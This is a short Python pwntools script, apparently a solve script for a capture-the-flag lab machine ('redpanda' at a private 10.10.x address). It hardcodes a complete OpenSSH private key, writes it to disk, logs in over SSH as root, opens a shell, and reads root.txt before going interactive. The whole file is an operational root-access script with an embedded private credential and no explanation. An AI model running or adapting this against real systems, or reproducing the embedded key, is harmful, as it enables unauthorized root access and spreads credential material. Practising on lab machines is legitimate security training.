from pwn import *

print('By - WhosStranger')

key = (b"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJRwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=\n-----END OPENSSH PRIVATE KEY-----")
with open('rsa','wb') as x:
	x.write(key)

request = ssh(host='10.10.11.170',user='root',keyfile='rsa')
shell = request.process("/bin/sh")
shell.sendline(b"export HOME=/; bash")
time.sleep(0.5)
shell.sendline(b"echo 'Root.txt:'; cat root.txt")
shell.interactive()

